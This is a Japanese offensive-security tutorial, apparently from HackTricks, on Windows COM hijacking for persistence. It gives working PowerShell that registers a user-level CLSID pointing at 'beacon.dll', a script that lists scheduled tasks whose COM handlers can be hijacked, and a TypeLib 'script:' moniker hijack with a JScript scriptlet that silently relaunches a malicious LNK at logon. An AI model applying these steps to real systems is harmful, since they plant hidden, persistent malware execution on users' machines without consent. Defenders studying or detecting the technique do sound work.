# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### 存在しない COM コンポーネントの検索

HKCU の値はユーザーによって変更できるため、**COM Hijacking** は**永続化の手段**として利用できます。`procmon` を使用すると、攻撃者が永続化のために作成できる、存在しない COM レジストリが検索された箇所を簡単に見つけられます。フィルタ:

- **RegOpenKey** の操作。
- _Result_ が **NAME NOT FOUND** のもの。
- _Path_ が **InprocServer32** で終わるもの。

偽装する存在しない COM を決めたら、以下のコマンドを実行します。_数秒ごとに読み込まれる COM を偽装すると過剰な動作を引き起こす可能性があるので注意してください。_
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### ハイジャック可能な Task Scheduler COM コンポーネント

Windows Tasks は Custom Triggers を使って COM オブジェクトを呼び出します。Task Scheduler 経由で実行されるため、いつトリガーされるかを予測しやすくなります。

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Task Name: " $Task.TaskName
Write-Host "Task Path: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

出力を確認すると、例えば **ユーザーがログインするたび** 実行されるタスクを選べます。

次に、CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** を **HKEY\CLASSES\ROOT\CLSID** と HKLM および HKCU で検索すると、通常その値は HKCU に存在しないことが分かります。
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
その後、HKCU エントリを作成するだけで、ユーザーがログインするたびにあなたの backdoor が実行されます。

---

## COM TypeLib Hijacking (script: moniker persistence)

Type Libraries (TypeLib) は COM インターフェースを定義し、`LoadTypeLib()` を介して読み込まれます。COM サーバーがインスタンス化されると、OS は関連する TypeLib を `HKCR\TypeLib\{LIBID}` 以下のレジストリキーを参照して読み込むことがあります。TypeLib のパスが **moniker**（例: `script:C:\...\evil.sct`）で置き換えられると、TypeLib が解決される際に Windows は scriptlet を実行します — これにより、一般的なコンポーネントが呼び出されたときに発動するステルス性の高い持続化が得られます。

これは Microsoft Web Browser control に対して確認されており（Internet Explorer、WebBrowser を埋め込んだアプリ、さらには `explorer.exe` によって頻繁に読み込まれます）。

### Steps (PowerShell)

1) 高頻度で使用される CLSID が使用する TypeLib (LIBID) を特定します。例として、マルウェアチェーンにより頻繁に悪用される CLSID: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser)。
```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```
2) ユーザーごとの TypeLib パスをローカルの scriptlet を指すように `script:` モニカーで設定する（管理者権限不要):
```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```
3) Drop 最小限の JScript `.sct` を配置して primary payload（例: initial chain で使用される `.lnk`）を再起動する:
```xml
<?xml version="1.0"?>
<scriptlet>
<registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
<script language="JScript">
<![CDATA[
try {
var sh = new ActiveXObject('WScript.Shell');
// Re-launch the malicious LNK for persistence
var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
sh.Run(cmd, 0, false);
} catch(e) {}
]]>
</script>
</scriptlet>
```
4) トリガー – IE を開く、WebBrowser control を埋め込んだアプリケーションを起動する、あるいは通常の Explorer の操作でさえ TypeLib をロードして scriptlet を実行し、ログオン/再起動時に chain を再有効化します。

クリーンアップ
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```
注意
- 他の高頻度で使用される COM コンポーネントにも同じロジックを適用できます；常に実際の `LIBID` を先に `HKCR\CLSID\{CLSID}\TypeLib` から解決してください。
- 64-bit システムでは、64-bit の利用者向けに `win64` サブキーも設定できます。

## 参考

- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)

{{#include ../../banners/hacktricks-training.md}}
